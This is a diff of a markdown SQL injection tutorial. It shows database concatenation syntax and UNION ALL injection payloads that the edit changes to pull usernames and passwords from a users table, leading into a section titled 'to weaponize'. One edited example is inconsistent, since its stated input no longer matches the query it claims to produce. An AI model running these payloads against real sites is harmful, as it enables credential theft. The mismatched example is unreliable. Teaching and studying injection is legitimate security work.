@@ -34,7 +34,7 @@ We have some technique to be sure when we are dealing with a blind or non-blind 
 | --- | --- |
 | MySQL | `SELECT 'coppito' 'zero' 'day'`<br/>`SELECT CONCAT('coppito','zero','day')`
 | MSSQL | `SELECT 'coppito' + 'zero' + 'day'`
-| Oracle | SELECT 'coppito' &vert;&vert; 'zero' &vert;&vert; 'day' <br/>`SELECT CONCAT('coppito','zero','day')`
+| Oracle | `SELECT 'coppito' &vert;&vert; 'zero' &vert;&vert; 'day'` <br/>`SELECT CONCAT('coppito','zero','day')`
 
 
 
@@ -227,7 +227,7 @@ Our `UNION` result will be stripped out.
 
 Using `$_GET[id] = "' UNION ALL SELECT 1, 2, 3 FROM users -- -"`, the query produced will be:
 ```
-  SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 FROM users -- - LIMIT 1'
+  SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT id, username, password FROM users -- - LIMIT 1'
 ```
 
 We will get:
@@ -238,18 +238,18 @@ We will get:
 
 We have to add a condition that always makes the WHERE clause false, before our UNION.
 
-Using `$_GET[id] = "'AND 1=0 UNION ALL SELECT 1, 2, 3 FROM users -- -"`, the query produced will be:
+Using `$_GET[id] = "'AND 1=0 UNION ALL SELECT username, password, 3 FROM users -- -"`, the query produced will be:
 ```
   SELECT id, title, content FROM pages WHERE id = '1' AND 1=0
   UNION ALL
-  SELECT 1, 2, 3 FROM users -- - LIMIT 1'
+  SELECT username, password, 3 FROM users -- - LIMIT 1'
 ```
 
 We will get:
 
 | id | title | content |
 | ---- | ---- | ---- |
-| 1 | 2 | 3 |
+| admin | password | 3 |
 
 
 ## 'CHEATSHEET (to weaponize)
